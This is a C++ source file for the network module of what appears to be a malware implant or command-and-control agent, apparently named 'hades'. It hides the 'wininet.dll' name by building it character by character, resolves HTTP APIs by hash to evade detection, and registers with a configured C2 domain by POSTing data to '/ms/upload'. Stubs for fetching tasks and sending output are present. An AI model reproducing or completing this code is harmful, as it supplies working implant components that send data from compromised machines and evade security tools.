#include "network.hpp"
#include "../utils/apidefs.hpp"
#include "../hades/config.hpp"
#include <stdio.h>



Network::Network() {
	this->HttpApis = AllocMemory<HTTPAPIS>(sizeof(struct HTTPAPIS));
	if (this->HttpApis == NULL) {
		printf("Failed Allocating HTTPApis");
	}
	char buf[12];
	buf[0]  = 'w';
	buf[1]  = 'i';
	buf[2]  = 'n';
	buf[3]  = 'i';
	buf[4]  = 'n';
	buf[5]  = 'e';
	buf[6]  = 't';
	buf[7]  = '.';
	buf[8]  = 'd';
	buf[9]  = 'l';
	buf[10] = 'l';
	buf[11] = '\0';

	kModules->WININET = WinApis->LoadLibraryA(buf);
	if (kModules->WININET) {
		this->HttpApis->InternetOpenA = (decltype(this->HttpApis->InternetOpenA))GetProc(kModules->WININET, HASHED_InternerOpenA);
		this->HttpApis->HttpAddRequestHeadersA = (decltype(this->HttpApis->HttpAddRequestHeadersA))GetProc(kModules->WININET, HASHED_AddHeaders);
		this->HttpApis->HttpOpenRequestA = (decltype(this->HttpApis->HttpOpenRequestA))GetProc(kModules->WININET, HASHED_OpenRequest);
		this->HttpApis->HttpSendRequestA = (decltype(this->HttpApis->HttpSendRequestA))GetProc(kModules->WININET, HASHED_SendRequest);
		this->HttpApis->InternetCloseHandle = (decltype(this->HttpApis->InternetCloseHandle))GetProc(kModules->WININET, HASHED_InternetCloseHandle);
		this->HttpApis->InternetConnectA = (decltype(this->HttpApis->InternetConnectA))GetProc(kModules->WININET, HASHED_InternetConnect);
		this->HttpApis->InternetReadFile = (decltype(this->HttpApis->InternetReadFile))GetProc(kModules->WININET, HASHED_InternetReadFile);
		this->HttpApis->InternetSetOptionA = (decltype(this->HttpApis->InternetSetOptionA))GetProc(kModules->WININET, HASHED_InternetSetOptionA);
	}

}



BOOL Network::RegisterClient(PBYTE Data, SIZE_T DataLength) {

	HINTERNET hInternrt = NULL, hConnect = NULL, hRequest = NULL;
	const char* h = "Content-Type: application/octect-stream";
	BOOL ok = FALSE;
	hInternrt = this->HttpApis->InternetOpenA("TEST", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternrt) goto CLEANUP;

	hConnect = this->HttpApis->InternetConnectA(hInternrt, conf->domains[0].domain, conf->domains[0].port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) goto CLEANUP;

	hRequest = this->HttpApis->HttpOpenRequestA(hConnect, "POST", "/ms/upload", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
	if (!hRequest) goto CLEANUP;

	if (!this->HttpApis->HttpSendRequestA(hRequest, h, (DWORD)strlen(h), (LPVOID)Data, DataLength)) {
		printf("Failed Sending Request\n");
		goto CLEANUP;
	}
	printf("[+] Sent Request Succesfully\n");
	ok = TRUE;


CLEANUP:
	if (hRequest) this->HttpApis->InternetCloseHandle(hRequest);
	if (hConnect) this->HttpApis->InternetCloseHandle(hConnect);
	if (hInternrt) this->HttpApis->InternetCloseHandle(hInternrt);
	return ok;
}


BOOL Network::GetTask(PBYTE OutData, SIZE_T BufSize) {
	return TRUE;
}


BOOL Network::SendOutput(PBYTE InData, SIZE_T InLen) {
	return TRUE;
}

Network* g_Network = NULL;